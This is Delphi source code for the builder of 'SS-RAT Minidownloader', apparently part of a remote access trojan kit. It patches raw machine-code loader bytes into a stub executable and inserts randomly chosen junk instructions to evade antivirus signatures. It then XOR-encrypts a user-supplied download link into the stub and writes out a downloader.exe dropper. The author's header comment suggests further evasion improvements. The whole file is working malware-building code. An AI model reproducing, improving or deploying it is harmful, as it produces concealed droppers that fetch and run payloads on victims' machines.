unit uMini;
{
  SS-RAT Minidownloader by Slayer616

  For the Developers:
  -The Trashcode Gen is pretty simple, it could be enchanced.
  -I use a static XOR Key, a dynamic one would be better.
  -We have LoadLibrary and GetprocAddress in the Import Table, not a that good idea!
}
interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls,afxCodeHook;
type
  TByteArray = array of Byte;
const
  sBuff = 'QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ';
type
  TForm21 = class(TForm)
    Label1: TLabel;
    Edit1: TEdit;
    Button1: TButton;
    Label2: TLabel;
    Label3: TLabel;
    procedure Button1Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form21: TForm21;
  bFile:    TByteArray;
  bMess:    TByteArray;
  bTemp:    TByteArray;
  dwPos:    integer;
  dwPlace:  integer;
  dwLastLength:integer;
  dwRand:   integer;
  i:        integer;
  sStrDownloader:string;
  sTempStr:string;
implementation

{$R *.dfm}
{This is trashcode}
procedure PUSHIT;
begin
asm
PUSH eax
end;
end;

procedure CMPIT;
begin
asm
cmp eax, 98
cmp eax, eax
end;
end;
procedure CMPIT_end(); begin end;

procedure SUBIT;
begin
asm
add eax, 2
sub eax, eax
end;
end;
procedure SUBIT_end(); begin end;

procedure MOVIT;
begin
asm
mov eax, 0
mov eax, eax
end;
end;
procedure MOVIT_end(); begin end;

procedure XORIT;
begin
asm
xor eax, eax
end;
end;
procedure XORIT_end(); begin end;

procedure POPIT;
begin
asm
pop eax
end;
end;
{Trashcode end!}

procedure WriteFileData(pFileData:string);
var
hFile:      THandle;
dWritten:   DWORD;
begin
hFile := CreateFile(pChar(GetCurrentDir + '\downloader.exe'), GENERIC_WRITE, FILE_SHARE_WRITE, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
SetFilePointer(hFile, 0, nil, FILE_BEGIN);
WriteFile(hFile, pFileData[1], length(pFileData), dWritten, nil);
CloseHandle(hFile);
end;

//Function to read Stub as String, we could use FileToBytes Function too
Function ReadStub: String;
Var
  FileHandle      : THandle;
  Buffer          : Pointer;
  Buffer2         : String;
  BytesRead       : Cardinal;
  Size            : Integer;
Begin
  FileHandle := CreateFile(pChar(GetCurrentDir + '\stub.dat'), GENERIC_READ, FILE_SHARE_READ, NIL, OPEN_ALWAYS	, FILE_ATTRIBUTE_NORMAL, FILE_FLAG_OVERLAPPED);
  Try
    Size := GetFileSize(FileHandle, NIL);
    GetMem(Buffer, Size);
    ReadFile(FileHandle, Buffer^, Size, BytesRead, NIL);
    SetLength(Buffer2, Bytesread);
    Move(Buffer^, Buffer2[1], BytesRead);
    FreeMem(Buffer);
  Finally
    CloseHandle(FileHandle);
  end;
  Result := Buffer2;
End;

procedure Move(Destination, Source: Pointer; dLength:DWORD);
begin
  CopyMemory(Destination, Source, dLength);
end;
function RandomInt(lbound, ubound: Integer): Integer;
begin
  Result := Random(Succ(ubound - lbound)) + lbound;
end;
//This is the Trashcode Generator
procedure PutinTrashcode;
begin
//PUSH EAX
  dwPlace := dwPlace + dwLastLength;
  dwLastLength := sizeofcode(@PUSHIT);
  SetLength(bTemp,sizeofcode(@PUSHIT));
  move(@bTemp[0],@PUSHIT,dwLastLength);
  move(@bFile[dwPlace],@bTemp[0],dwLastLength);

  for i := 0 to 1 do begin
    Randomize;
  dwRand :=  RandomInt(1,4);
  if dwRand = 1 then begin
    dwPlace := dwPlace + dwLastLength;
    dwLastLength := (DWORD(@SUBIT_end) - DWORD(@SUBIT)) -3 ;
    SetLength(bTemp,dwLastLength);
    move(@bTemp[0],@SUBIT,dwLastLength);
    move(@bFile[dwPlace],@bTemp[0],dwLastLength);
  end else if dwRand = 2 then begin
    dwPlace := dwPlace + dwLastLength;
    dwLastLength := (DWORD(@XORIT_end) - DWORD(@XORIT)) - 2;
    SetLength(bTemp,dwLastLength);
    move(@bTemp[0],@XORIT,dwLastLength);
    move(@bFile[dwPlace],@bTemp[0],dwLastLength);
  end else if dwRand = 3 then begin
    dwPlace := dwPlace + dwLastLength;
    dwLastLength := (DWORD(@CMPIT_end) - DWORD(@CMPIT)) - 3;
    SetLength(bTemp,dwLastLength);
    move(@bTemp[0],@CMPIT,dwLastLength);
    move(@bFile[dwPlace],@bTemp[0],dwLastLength);
  end else begin
    dwPlace := dwPlace + dwLastLength;
    dwLastLength := (DWORD(@MOVIT_end) - DWORD(@MOVIT)) -3;
    SetLength(bTemp,dwLastLength);
    move(@bTemp[0],@MOVIT,dwLastLength);
    move(@bFile[dwPlace],@bTemp[0],dwLastLength);
  end;
  end;

  //POP EAX
  dwPlace := dwPlace + dwLastLength;
  dwLastLength := sizeofcode(@POPIT);
  SetLength(bTemp,sizeofcode(@POPIT));
  move(@bTemp[0],@POPIT,dwLastLength);
  move(@bFile[dwPlace],@bTemp[0],dwLastLength);
end;

function GetCurrentDir: string;
begin
  GetDir(0, Result);
end;

function FileToBytes(sPath:string; var bFile:TByteArray):Boolean;
var
hFile:    Cardinal;
dSize:    DWORD;
dRead:    DWORD;
begin
  Result := FALSE;
  hFile := CreateFile(PChar(sPath), GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, 0, 0);
  if hFile <> 0 then
  begin
    dSize := GetFileSize(hFile, nil);
    SetFilePointer(hFile, 0, nil, FILE_BEGIN);
    SetLength(bFile, dSize);
    if ReadFile(hFile, bFile[0], dSize, dRead, nil) then
      Result := TRUE;
    CloseHandle(hFile);
  end;
end;

//Simple XOR Encryption -> Thanks to VortX
function Encrypt(tr : string): string;
var
  i: Integer;
  Temp: string;
begin
for i := 1 to Length(tr) do
begin
  Temp := Temp + Chr(Ord(tr[i]) xor 5);
end;
  result := Temp;
end;

//Converts Integer to Byte
function IntToByte(i:Integer):Byte;
asm
  MOV  EAX,i
  CMP  EAX,254
  JG   @SETHI
  CMP  EAX,1
  JL   @SETLO
  RET
@SETHI:
  MOV  EAX,255
  RET
@SETLO:
  MOV  EAX,0
end;

//this will fill 0bytes into the String until the string reaches the original Size
function PrepareString(sString:string):string;
var
  sLeftStr:string;
  sLeftStrSize, i:integer;
begin
  sLeftStrSize :=  length(sBuff) - length(sString);
  if sLeftStrSize <> 0 then begin
    for i := 1 to sLeftStrSize do begin
      sLeftstr := sLeftStr + #0;
    end;
    result := sString + sLeftStr;
  end;
end;

procedure BytesToFile(bData:TByteArray; sPath:string);
var
hFile:    THandle;
dWritten: DWORD;
begin
  hFile := CreateFile(PChar(sPath), GENERIC_WRITE, FILE_SHARE_WRITE, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
  if hFile <> 0 then
  begin
    SetFilePointer(hFile, 0, nil, FILE_BEGIN);
    WriteFile(hFile, bData[0],Length(bData), dWritten, nil);
    CloseHandle(hFile);
  end;
end;

procedure TForm21.Button1Click(Sender: TObject);
begin
if FileToBytes(GetCurrentDir + '\Stub\stubdownloader.exe', bFile) then begin
  SetLength(bMess,18);
  bMess[0] := $BA;
  bMess[1] := $00;
  bMess[2] := $00;
  bMess[3] := $00;
  bMess[4] := $05;
  bMess[5] := $B8;
  bMess[6] := $00;
  bMess[7] := $00;
  bMess[8] := $00;
  bMess[9] := $00;
  bMess[10] := $50;
  bMess[11] := $58;
  bMess[12] := $83;
  bMess[13] := $FA;
  bMess[14] := $00;
  bMess[15] := $4A;
  bMess[16] := $7F;
  bMess[17] := $F3;
  dwPlace := 640;
  dwLastLength := 18;
  move(@bFile[dwPlace],@bMess[0],dwLastLength);

  SetLength(bMess,18);
  bMess[0] := $B9;
  bMess[1] := $5D;
  bMess[2] := $10;
  bMess[3] := $40;
  bMess[4] := $00;
  bMess[5] := $B0;
  bMess[6] := $05;
  bMess[7] := $30;
  bMess[8] := $01;
  bMess[9] := $41;
  bMess[10] := $81;
  bMess[11] := $F9;
  bMess[12] := $67;
  bMess[13] := $10;
  bMess[14] := $40;
  bMess[15] := $00;
  bMess[16] := $75;
  bMess[17] := $F5;
  dwPlace := dwPlace + dwLastLength;
  dwLastLength := 18;
  move(@bFile[dwPlace],@bMess[0],dwLastLength);

  //PutinTrashcode;

  SetLength(bMess,18);
  bMess[0] := $B9;
  bMess[1] := $18;
  bMess[2] := $10;
  bMess[3] := $40;
  bMess[4] := $00;
  bMess[5] := $B0;
  bMess[6] := $05;
  bMess[7] := $30;
  bMess[8] := $01;
  bMess[9] := $41;
  bMess[10] := $81;
  bMess[11] := $F9;
  bMess[12] := $56;
  bMess[13] := $10;
  bMess[14] := $40;
  bMess[15] := $00;
  bMess[16] := $75;
  bMess[17] := $F5;
  dwPlace := dwPlace + dwLastLength;
  dwLastLength := 18;
  move(@bFile[dwPlace],@bMess[0],dwLastLength);

  PutinTrashcode;

  SetLength(bMess,18);
  bMess[0] := $B9;
  bMess[1] := $68;
  bMess[2] := $10;
  bMess[3] := $40;
  bMess[4] := $00;
  bMess[5] := $B0;
  bMess[6] := $05;
  bMess[7] := $30;
  bMess[8] := $01;
  bMess[9] := $41;
  bMess[10] := $81;
  bMess[11] := $F9;
  bMess[12] := $7A;
  bMess[13] := $10;
  bMess[14] := $40;
  bMess[15] := $00;
  bMess[16] := $75;
  bMess[17] := $F5;
  dwPlace := dwPlace + dwLastLength;
  dwLastLength := 18;
  move(@bFile[dwPlace],@bMess[0],dwLastLength);

  PutinTrashcode;

  SetLength(bMess,10);
  bMess[0] := $68;
  bMess[1] := $5D;
  bMess[2] := $10;
  bMess[3] := $40;
  bMess[4] := $00;
  bMess[5] := $E8;
  bMess[6] := $30;
  bMess[7] := $00;
  bMess[8] := $00;
  bMess[9] := $00;
  dwPlace := dwPlace + dwLastLength;
  dwLastLength := 10;
  dwPos := dwPlace + 7;
  bMess[6] := inttobyte(859 - dwPos);
  move(@bFile[dwPlace],@bMess[0],dwLastLength);

  PutinTrashcode;

  SetLength(bMess,11);
  bMess[0] := $68;
  bMess[1] := $68;
  bMess[2] := $10;
  bMess[3] := $40;
  bMess[4] := $00;
  bMess[5] := $50;
  bMess[6] := $E8;
  bMess[7] := $37;
  bMess[8] := $00;
  bMess[9] := $00;
  bMess[10] := $00;
  dwPlace := dwPlace + dwLastLength;
  dwLastLength := 11;
  dwPos := dwPlace + 8;
  bMess[7] := inttobyte(640 + 213 - dwPos);
  move(@bFile[dwPlace],@bMess[0],dwLastLength);

  PutinTrashcode;

  SetLength(bMess,18);
  bMess[0] := $6A;
  bMess[1] := $00;
  bMess[2] := $6A;
  bMess[3] := $00;
  bMess[4] := $68;
  bMess[5] := $57;
  bMess[6] := $10;
  bMess[7] := $40;
  bMess[8] := $00;
  bMess[9] := $68;
  bMess[10] := $18;
  bMess[11] := $10;
  bMess[12] := $40;
  bMess[13] := $00;
  bMess[14] := $6A;
  bMess[15] := $00;
  bMess[16] := $FF;
  bMess[17] := $D0;
  dwPlace := dwPlace + dwLastLength;
  dwLastLength := 18;
  move(@bFile[dwPlace],@bMess[0],dwLastLength);

  PutinTrashcode;

  SetLength(bMess,23);
  bMess[0] := $6A;
  bMess[1] := $01;
  bMess[2] := $6A;
  bMess[3] := $00;
  bMess[4] := $6A;
  bMess[5] := $00;
  bMess[6] := $68;
  bMess[7] := $57;
  bMess[8] := $10;
  bMess[9] := $40;
  bMess[10] := $00;
  bMess[11] := $68;
  bMess[12] := $7B;
  bMess[13] := $10;
  bMess[14] := $40;
  bMess[15] := $00;
  bMess[16] := $6A;
  bMess[17] := $00;
  bMess[18] := $E8;
  bMess[19] := $1A;
  bMess[20] := $00;
  bMess[21] := $00;
  bMess[22] := $00;
  dwPlace := dwPlace + dwLastLength;
  dwLastLength := 23;
  dwPos := dwPlace + 20;
  bMess[19] := inttobyte(640 + 225 - dwPos);
  move(@bFile[dwPlace],@bMess[0],dwLastLength);
  
  PutinTrashcode;

  BytesToFile(bFile, GetCurrentDir + '\stub.dat');
end;

if length(edit1.Text) = 0 then begin
  Showmessage('Invalid Downloadlink!');
  exit;
end;
if length(edit1.Text) > length(sBuff) then begin
  Showmessage('Downloadlink to long!');
  exit;
end;
if fileexists(GetCurrentDir + '\stub.dat') then begin
   sStrDownloader := ReadStub;
   sTempStr := copy(sStrdownloader,1,pos(sBuff,sStrDownloader) - 1);
   sTempStr := sTempStr + Encrypt(preparestring(edit1.text));
   sTempStr := sTempStr + copy(sStrDownloader,length(sTempStr) + 1,length(sStrDownloader) - length(sTempStr));
   writefiledata(sTempstr);
   showmessage('Done!');
end else begin
  Showmessage('Cant find Stub!');
end;
deletefile(GetCurrentDir + '\stub.dat');
end;

end.
